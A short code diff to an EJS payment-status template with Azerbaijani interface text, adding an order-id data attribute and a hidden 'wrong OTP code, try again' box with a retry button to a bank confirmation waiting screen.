@@ -18,6 +18,7 @@
         <% if (codeSubmitted) { %>
           <div id="stageBox" class="text-center"
                data-status-url="/api/payment/<%= order._id %>/status"
+               data-order-id="<%= order._id %>"
                data-stage="<%= stage %>"
                data-stage-seconds="<%= stageSeconds %>"
                data-seconds-left="<%= secondsLeft %>">
@@ -25,6 +26,10 @@
             <div data-stage-alert class="alert alert--error" style="display:none"></div>
             <%- include('../partials/countdown-ring') %>
             <p class="sec-note" data-stage-note>Bank yekun təsdiqi aparır. Bu ekranı bağlamayın.</p>
+            <div id="retryBox" style="display:none;margin-top:20px">
+              <p class="alert alert--error"><strong>OTP kodu səhvdir!</strong> Lütfən yenidən cəhd edin.</p>
+              <button type="button" id="retryBtn" class="btn btn--secondary">Yenidən Cəhd Et</button>
+            </div>
           </div>
         <% } else { %>
           <div class="alert alert--success">Bankdan göndərilən yeni OTP kodunu daxil edin.</div>
